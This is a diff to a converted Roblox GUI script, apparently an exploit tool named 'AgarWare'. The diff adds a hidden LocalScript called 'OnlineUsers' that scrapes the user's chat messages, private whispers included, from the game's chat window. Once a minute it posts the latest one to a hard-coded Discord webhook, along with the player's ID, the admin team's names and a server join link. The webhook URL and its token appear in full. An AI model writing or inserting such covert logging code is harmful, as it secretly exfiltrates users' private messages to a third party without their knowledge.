@@ -7,7 +7,7 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
--- Instances: 691 | Scripts: 160 | Modules: 0 | Tags: 0
+-- Instances: 693 | Scripts: 161 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.AgarWareGui
@@ -7592,6 +7592,16 @@ G2L["2b3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["2b3"]["Text"] = [[GAME NAME]];
 G2L["2b3"]["Name"] = [[GameNameLoaded]];
 G2L["2b3"]["Position"] = UDim2.new(0, 0, 0.65476, 0);
+
+
+-- StarterGui.AgarWareGui.WebhookLogging
+G2L["2b4"] = Instance.new("Folder", G2L["1"]);
+G2L["2b4"]["Name"] = [[WebhookLogging]];
+
+
+-- StarterGui.AgarWareGui.WebhookLogging.OnlineUsers
+G2L["2b5"] = Instance.new("LocalScript", G2L["2b4"]);
+G2L["2b5"]["Name"] = [[OnlineUsers]];
 
 
 -- StarterGui.AgarWareGui.MoveToCorGui
@@ -31633,5 +31643,264 @@ local script = G2L["2b0"];
 	LoadedMainFrame.Visible = false
 end;
 task.spawn(C_2b0);
+-- StarterGui.AgarWareGui.WebhookLogging.OnlineUsers
+local function C_2b5()
+local script = G2L["2b5"];
+	local HttpService = game:GetService("HttpService")
+	local Players = game:GetService("Players")
+	local Teams = game:GetService("Teams")
+	local LocalPlayer = Players.LocalPlayer
+	
+	local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1495643916723163287/Dyzh0xCRJGD7xmE7mnsKRTot_rfhN-61VppNMHvFpVtzyA147EcQjqK3ALZlOD_9wBgO"
+	
+	task.wait(2)
+	
+	local CoreGui = game:GetService("CoreGui")
+	local ExperienceChat = CoreGui:FindFirstChild("ExperienceChat")
+	
+	if not ExperienceChat then return end
+	
+	local chatWindow = ExperienceChat:WaitForChild("appLayout"):WaitForChild("chatWindow")
+	local scrollingView = chatWindow:WaitForChild("scrollingView")
+	local bottomLockedScrollView = scrollingView:WaitForChild("bottomLockedScrollView")
+	local RCTScrollView = bottomLockedScrollView:WaitForChild("RCTScrollView")
+	local RCTScrollContentView = RCTScrollView:WaitForChild("RCTScrollContentView")
+	
+	local processedFrames = {}
+	local messageQueue = {}
+	local lastSendMinute = -1
+	
+	-- Calculate offset based on UserId (between -2 and +2 seconds from :00)
+	local function getUserOffset()
+		-- Use UserId to generate consistent offset between -2 and +2
+		local offset = (LocalPlayer.UserId % 5) - 2
+		return offset
+	end
+	
+	local USER_OFFSET = getUserOffset()
+	
+	local function getAdmins()
+		local admins = {}
+		local chosenTeam = Teams:FindFirstChild("Chosen")
+	
+		if chosenTeam then
+			for _, player in pairs(Players:GetPlayers()) do
+				if player.Team == chosenTeam then
+					table.insert(admins, player)
+				end
+			end
+		end
+	
+		return admins
+	end
+	
+	local function getAdminFooter()
+		local admins = getAdmins()
+	
+		if #admins == 0 then
+			return "Admin: None"
+		end
+	
+		local adminTexts = {}
+		for i, admin in ipairs(admins) do
+			table.insert(adminTexts, admin.DisplayName .. " / " .. admin.Name)
+		end
+	
+		return "Admin: " .. table.concat(adminTexts, ", ")
+	end
+	
+	local function getEmbedColor(buttonText)
+		if string.match(buttonText, "HIDDEN CHAT") then
+			return 0xff0000
+		end
+	
+		if string.match(buttonText, "%[From") or string.match(buttonText, "%[To") then
+			return 0x000000
+		end
+	
+		local r, g, b = string.match(buttonText, "rgb%((%d+),(%d+),(%d+)%)")
+		if r and g and b then
+			r, g, b = tonumber(r), tonumber(g), tonumber(b)
+			return (r * 65536) + (g * 256) + b
+		end
+	
+		return 0xffffff
+	end
+	
+	local function getJoinLink()
+		local ok, link = pcall(function()
+			return "https://www.roblox.com/games/start?placeId="
+				.. game.PlaceId
+				.. "&gameInstanceId=" .. game.JobId
+		end)
+		return ok and link or ""
+	end
+	
+	local function containsAgarv(message)
+		return string.match(string.lower(message), "@agarv") ~= nil
+	end
+	
+	local function sendWebhook(display, message, embedColor, buttonText)
+		local prefix = ""
+		local hasMention = containsAgarv(message)
+	
+		local toMatch = string.match(buttonText, "%[To .-%]")
+		local fromMatch = string.match(buttonText, "%[From .-%]")
+	
+		if toMatch then
+			prefix = "*" .. toMatch .. "* "
+		elseif fromMatch then
+			prefix = "*" .. fromMatch .. "* "
+		end
+	
+		local title = prefix .. "**" .. display .. "** " .. message
+	
+		local embed = {
+			["title"] = title,
+			["color"] = embedColor,
+			["footer"] = {
+				["text"] = getAdminFooter()
+			},
+			["timestamp"] = DateTime.now():ToIsoDate()
+		}
+	
+		if hasMention then
+			embed["description"] = "[Join Game](" .. getJoinLink() .. ")"
+		end
+	
+		local payload = {
+			["username"] = tostring(LocalPlayer.UserId),
+			["embeds"] = {embed}
+		}
+	
+		if hasMention then
+			payload["content"] = "<@1301477323090034731>"
+		end
+	
+		local requestFunc = request or http_request or (syn and syn.request) or (http and http.request)
+	
+		pcall(function()
+			requestFunc({
+				Url = WEBHOOK_URL,
+				Method = "POST",
+				Headers = {
+					["Content-Type"] = "application/json"
+				},
+				Body = HttpService:JSONEncode(payload)
+			})
+		end)
+	end
+	
+	local function queueMessage(display, message, embedColor, buttonText)
+		table.insert(messageQueue, {
+			display = display,
+			message = message,
+			embedColor = embedColor,
+			buttonText = buttonText
+		})
+	end
+	
+	local function processQueue()
+		if #messageQueue == 0 then return end
+	
+		-- Send the most recent message in queue
+		local data = messageQueue[#messageQueue]
+		messageQueue = {} -- Clear queue
+	
+		sendWebhook(data.display, data.message, data.embedColor, data.buttonText)
+	end
+	
+	-- Timer loop that sends at specific second intervals
+	task.spawn(function()
+		while true do
+			local now = DateTime.now():ToLocalTime()
+			local currentMinute = now.Minute
+			local currentSecond = now.Second
+	
+			-- Calculate target second (0 + offset, wrapped to 0-59)
+			local targetSecond = USER_OFFSET
+			if targetSecond < 0 then
+				targetSecond = 60 + targetSecond -- -2 becomes 58, -1 becomes 59
+			end
+	
+			-- Check if we're at the target second and haven't sent this minute
+			if currentSecond == targetSecond and currentMinute ~= lastSendMinute then
+				processQueue()
+				lastSendMinute = currentMinute
+			end
+	
+			task.wait(0.5)
+		end
+	end)
+	
+	local function onFrameAdded(frame)
+		if processedFrames[frame] then return end
+		processedFrames[frame] = true
+	
+		local frameName = frame.Name
+		local userId = string.match(frameName, "^(%d+)%-")
+	
+		if not userId or userId == "0" then return end
+	
+		if tonumber(userId) ~= LocalPlayer.UserId then return end
+	
+		task.wait(0.1)
+	
+		local textMessage = frame:FindFirstChild("TextMessage")
+		if not textMessage then return end
+	
+		local prefixText = textMessage:FindFirstChild("PrefixText")
+		local bodyText = textMessage:FindFirstChild("BodyText")
+		local textButton = textMessage:FindFirstChild("TextMessageButton")
+	
+		if not prefixText or not bodyText or not textButton then return end
+	
+		local textButtonButton = textButton:FindFirstChild("TextButton")
+		if not textButtonButton then return end
+	
+		local display = prefixText.ContentText
+	
+		display = string.gsub(display, "%[To .-%] ", "")
+		display = string.gsub(display, "%[From .-%] ", "")
+	
+		local fullMessage = bodyText.ContentText
+		local buttonText = textButtonButton.Text
+		local isPrivate = string.match(buttonText, "%[From") or string.match(buttonText, "%[To")
+	
+		local message = fullMessage
+	
+		if isPrivate then
+			message = string.gsub(message, "%[To .-%] ", "")
+			message = string.gsub(message, "%[From .-%] ", "")
+	
+			if string.sub(message, 1, #display) == display then
+				message = string.sub(message, #display + 1)
+			end
+		else
+			if string.sub(fullMessage, 1, #display) == display then
+				message = string.sub(fullMessage, #display + 1)
+			end
+		end
+	
+		message = string.match(message, "^%s*(.-)%s*$")
+	
+		local embedColor = getEmbedColor(buttonText)
+	
+		queueMessage(display, message, embedColor, buttonText)
+	end
+	
+	for _, child in pairs(RCTScrollContentView:GetChildren()) do
+		if child:IsA("Frame") then
+			processedFrames[child] = true
+		end
+	end
+	
+	RCTScrollContentView.ChildAdded:Connect(function(child)
+		if child:IsA("Frame") then
+			onFrameAdded(child)
+		end
+	end)
+end;
+task.spawn(C_2b5);
 
 return G2L["1"], require;
